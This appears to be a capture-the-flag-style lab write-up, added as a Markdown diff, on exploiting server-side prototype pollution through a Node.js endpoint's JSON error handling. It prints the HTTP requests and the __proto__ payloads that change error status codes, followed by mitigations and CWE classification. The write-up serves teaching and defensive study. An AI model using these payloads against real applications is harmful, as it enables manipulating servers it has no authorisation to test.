@@ -1,0 +1,614 @@
+# PortSwigger Web Security Academy
+
+## Server-side prototype pollution via error handling
+
+### Objective
+
+The objective of this lab was to identify and exploit a **server-side prototype pollution vulnerability** in the `/my-account/change-address` endpoint.
+
+The application accepts user-controlled JSON data and processes it server-side. By manipulating the special `__proto__` property, it was possible to inject arbitrary properties into the server-side JavaScript object prototype.
+
+The vulnerability was confirmed by first injecting an arbitrary `foo` property and subsequently abusing the application's error-handling mechanism to modify the `status` and `statusCode` values returned in JSON error responses.
+
+The final exploitation chain was:
+
+```text
+Attacker-controlled JSON
+        ↓
+__proto__
+        ↓
+Object.prototype pollution
+        ↓
+status = 555
+        ↓
+Error object inherits polluted property
+        ↓
+statusCode = 555
+        ↓
+Prototype pollution confirmed
+```
+
+---
+
+# Technologies involved
+
+* Burp Suite Community Edition
+* HTTP/2
+* JSON
+* JavaScript
+* Node.js
+* Express
+* `Object.prototype`
+* Server-side prototype pollution
+
+---
+
+# Reconnaissance
+
+After authenticating to the application, I accessed the account page and submitted the billing and delivery address form.
+
+Using **Burp Suite → Proxy → HTTP history**, I identified the following request:
+
+```http
+POST /my-account/change-address HTTP/2
+Host: 0aa400d50408eae380ddc1a2006400b5.web-security-academy.net
+Cookie: session=3A9lwzyirazbIhiAxpCdPuEcErrZYVc6
+Content-Type: application/json;charset=UTF-8
+
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6"
+}
+```
+
+The endpoint accepted JSON input and returned a JSON representation of the authenticated user:
+
+```json
+{
+  "username": "wiener",
+  "firstname": "Peter",
+  "lastname": "Wiener",
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "isAdmin": false
+}
+```
+
+The request was then sent to **Burp Repeater** for testing.
+
+---
+
+# Identification
+
+## Testing the `__proto__` property
+
+The first step was to determine whether the endpoint was susceptible to prototype pollution.
+
+An arbitrary property was injected through the `__proto__` property:
+
+```json
+"__proto__": {
+  "foo": "bar"
+}
+```
+
+The resulting request body was:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
+  "__proto__": {
+    "foo": "bar"
+  }
+}
+```
+
+The application returned a normal `200 OK` response:
+
+```json
+{
+  "username": "wiener",
+  "firstname": "Peter",
+  "lastname": "Wiener",
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "isAdmin": false
+}
+```
+
+The injected `foo` property was not present in the user object.
+
+However, this did not rule out prototype pollution because the injected property would only become visible if the application later accessed an object that did not have its own `foo` property.
+
+Therefore, an additional observable behavior was required.
+
+---
+
+# Identifying a Prototype Pollution Source
+
+## Triggering a JSON parsing error
+
+The application returned structured error information when malformed JSON was submitted.
+
+To investigate this behavior, the JSON syntax was intentionally broken by removing the comma between two properties:
+
+```json
+"address_line_2": "One Wiener Way"
+"city": "Tarragona",
+```
+
+The malformed request generated:
+
+```http
+HTTP/2 500 Internal Server Error
+```
+
+with the following response:
+
+```json
+{
+  "error": {
+    "expose": true,
+    "statusCode": 400,
+    "status": 400,
+    "body": "...",
+    "type": "entity.parse.failed",
+    "foo": "bar"
+  }
+}
+```
+
+The presence of:
+
+```json
+"foo": "bar"
+```
+
+inside the error object was significant.
+
+The application had not explicitly assigned `foo` to the error object. The property was instead inherited from the polluted prototype.
+
+This provided strong evidence that the previous payload had resulted in:
+
+```javascript
+Object.prototype.foo = "bar";
+```
+
+Conceptually:
+
+```text
+__proto__.foo = "bar"
+        ↓
+Object.prototype.foo = "bar"
+        ↓
+error.foo
+        ↓
+"bar"
+```
+
+This confirmed the presence of a server-side prototype pollution vulnerability.
+
+---
+
+# Exploitation
+
+## Polluting the `status` property
+
+The next step was to identify a security-relevant or observable property that could be controlled through prototype pollution.
+
+The error object contained:
+
+```json
+"status": 400,
+"statusCode": 400
+```
+
+The payload was therefore modified to inject an alternative status value:
+
+```json
+"__proto__": {
+  "status": 555
+}
+```
+
+The complete valid request body was:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way",
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
+  "__proto__": {
+    "status": 555
+  }
+}
+```
+
+The valid request returned the normal `200 OK` response.
+
+This was expected because the normal user object did not expose the polluted `status` property.
+
+---
+
+# Triggering the Gadget
+
+The JSON syntax was then intentionally broken again while keeping the prototype pollution payload:
+
+```json
+{
+  "address_line_1": "Wiener HQ",
+  "address_line_2": "One Wiener Way"
+  "city": "Tarragona",
+  "postcode": "BU1 1RP",
+  "country": "UK",
+  "sessionId": "3A9lwzyirazbIhiAxpCdPuEcErrZYVc6",
+  "__proto__": {
+    "status": 555
+  }
+}
+```
+
+The server returned:
+
+```http
+HTTP/2 500 Internal Server Error
+```
+
+However, the JSON error object was now:
+
+```json
+{
+  "error": {
+    "expose": false,
+    "statusCode": 555,
+    "status": 555,
+    "body": "...",
+    "type": "entity.parse.failed",
+    "foo": "bar"
+  }
+}
+```
+
+The critical evidence was:
+
+```json
+"statusCode": 555,
+"status": 555
+```
+
+The original error response contained:
+
+```json
+"statusCode": 400,
+"status": 400
+```
+
+After prototype pollution, both values were changed to the attacker-controlled value:
+
+```text
+555
+```
+
+This confirmed that the application was reading the polluted `status` property from the prototype.
+
+---
+
+# Evidence
+
+## Initial response
+
+The normal endpoint returned:
+
+```json
+"isAdmin": false
+```
+
+and did not contain the injected `foo` property.
+
+---
+
+## Prototype pollution confirmation
+
+After injecting:
+
+```json
+"__proto__": {
+  "foo": "bar"
+}
+```
+
+and triggering a JSON parsing error, the response contained:
+
+```json
+"foo": "bar"
+```
+
+inside the `error` object.
+
+This demonstrated that the error object inherited the attacker-controlled property.
+
+---
+
+## Status manipulation
+
+The following payload was used:
+
+```json
+"__proto__": {
+  "status": 555
+}
+```
+
+After triggering the JSON parsing error, the response changed from:
+
+```json
+"statusCode": 400,
+"status": 400
+```
+
+to:
+
+```json
+"statusCode": 555,
+"status": 555
+```
+
+This provided definitive evidence of server-side prototype pollution.
+
+---
+
+# Root Cause
+
+The root cause is unsafe processing of attacker-controlled JSON properties.
+
+The application accepts a JSON object containing user-controlled keys and allows the special `__proto__` property to influence the JavaScript prototype chain.
+
+This allows an attacker to inject arbitrary properties into objects through `Object.prototype`.
+
+Conceptually, the application allows behavior equivalent to:
+
+```javascript
+Object.prototype.status = 555;
+```
+
+Objects that do not define their own `status` property can then inherit the attacker-controlled value:
+
+```javascript
+error.status === 555;
+```
+
+The error-handling functionality subsequently uses this inherited property when constructing the JSON error response.
+
+The same behavior was demonstrated using the arbitrary `foo` property:
+
+```javascript
+Object.prototype.foo = "bar";
+```
+
+which resulted in:
+
+```json
+"foo": "bar"
+```
+
+appearing in the error object.
+
+---
+
+# Impact
+
+The vulnerability allows an unauthenticated or authenticated attacker, depending on the application's access controls around the vulnerable endpoint, to influence properties inherited by server-side JavaScript objects.
+
+In this lab, the attacker was able to modify the effective error status:
+
+```text
+400 → 555
+```
+
+and influence both:
+
+```text
+status
+statusCode
+```
+
+This demonstrates arbitrary manipulation of server-side application behavior.
+
+Prototype pollution can have significantly greater impact when security-sensitive gadgets are available. Depending on the application's codebase, possible consequences include:
+
+* Authorization bypass
+* Privilege escalation
+* Modification of application configuration
+* Denial of service
+* Authentication bypass
+* Manipulation of security-sensitive properties
+* Server-side code execution in vulnerable application architectures
+
+The actual severity depends on the gadgets reachable from the polluted prototype.
+
+---
+
+# Mitigations
+
+## 1. Block prototype-related properties
+
+Applications should reject dangerous property names when processing untrusted JSON:
+
+```text
+__proto__
+constructor
+prototype
+```
+
+These should not be accepted as arbitrary user-controlled object keys.
+
+---
+
+## 2. Use allowlists for expected properties
+
+The address endpoint should only accept the properties that are actually required:
+
+```javascript
+const allowedFields = [
+  "address_line_1",
+  "address_line_2",
+  "city",
+  "postcode",
+  "country"
+];
+```
+
+Unexpected properties should be rejected.
+
+---
+
+## 3. Avoid unsafe object merging
+
+Generic recursive merge operations should not be performed directly on attacker-controlled objects.
+
+Application code should explicitly map validated input into trusted application objects.
+
+---
+
+## 4. Use prototype-free objects where appropriate
+
+For data structures that do not require inheritance, applications can consider:
+
+```javascript
+Object.create(null)
+```
+
+This prevents normal inheritance from `Object.prototype`.
+
+---
+
+## 5. Validate JSON against a strict schema
+
+The endpoint should enforce a strict JSON schema defining:
+
+* Allowed properties
+* Expected data types
+* Required properties
+* Maximum lengths
+* Rejection of additional properties
+
+For example, unexpected keys such as `__proto__` should not be accepted.
+
+---
+
+## 6. Avoid relying on inherited security-sensitive properties
+
+Security-sensitive values should not be determined solely through normal JavaScript property lookup.
+
+Where appropriate, applications should explicitly verify own properties:
+
+```javascript
+Object.hasOwn(object, "status")
+```
+
+For authorization-related properties, security decisions should rely on trusted server-side state rather than properties that may be inherited.
+
+---
+
+## 7. Keep dependencies updated
+
+Prototype pollution vulnerabilities can also originate from third-party libraries responsible for:
+
+* Object merging
+* Object cloning
+* Recursive assignment
+* Configuration parsing
+
+Dependencies should be regularly updated and reviewed for known prototype pollution vulnerabilities.
+
+---
+
+# Classifications
+
+### CWE
+
+**CWE-1321 — Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')**
+
+The application allows attacker-controlled input to modify properties inherited through JavaScript object prototypes.
+
+### OWASP
+
+**OWASP Top 10 — A03:2021 Injection**
+
+Prototype pollution can be considered an injection-style vulnerability because attacker-controlled input modifies server-side application objects and subsequently influences application behavior.
+
+### Vulnerability Type
+
+**Server-Side Prototype Pollution**
+
+### Primary Impact
+
+**Server-Side Application Logic Manipulation**
+
+---
+
+# Conclusions
+
+The `/my-account/change-address` endpoint was vulnerable to server-side prototype pollution through the `__proto__` property.
+
+The initial injection of:
+
+```json
+{
+  "__proto__": {
+    "foo": "bar"
+  }
+}
+```
+
+did not alter the normal user response. However, when a JSON parsing error was triggered, the injected `foo` property appeared inside the server-generated error object.
+
+This demonstrated that the error object was inheriting attacker-controlled properties from the polluted prototype.
+
+The vulnerability was subsequently confirmed using:
+
+```json
+{
+  "__proto__": {
+    "status": 555
+  }
+}
+```
+
+After triggering a parsing error, the application returned:
+
+```json
+"statusCode": 555,
+"status": 555
+```
+
+instead of the expected:
+
+```json
+"statusCode": 400,
+"status": 400
+```
+
+This confirmed that attacker-controlled properties had successfully propagated through the server-side JavaScript prototype chain.
+
+The key security lesson is that the absence of an injected property from an immediate JSON response **does not prove that prototype pollution is impossible**. Prototype pollution often becomes observable only when a polluted property is subsequently accessed by another object or application component.
+
+In this case, the application's error-handling logic provided the necessary gadget to demonstrate the vulnerability conclusively.
